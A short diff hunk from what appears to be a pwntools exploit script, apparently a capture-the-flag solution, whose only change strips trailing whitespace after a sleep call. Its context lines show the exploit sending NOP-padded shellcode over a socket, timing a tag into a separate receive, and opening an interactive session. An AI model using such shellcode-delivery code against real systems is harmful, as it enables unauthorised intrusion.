@@ -21,7 +21,7 @@ sock.send(flat(nop_pad(0xD4, shellcode, avoid = ''.join(chr(n) for n in range(32
 #
 # In both these cases, it is nececary to sleep, to make sure that
 # the tag will be the first 4 bytes of a seperate recv.
-sleep(0.1) 
+sleep(0.1)
 
 sock.send(p32(tag).ljust(127))
 sock.interactive()
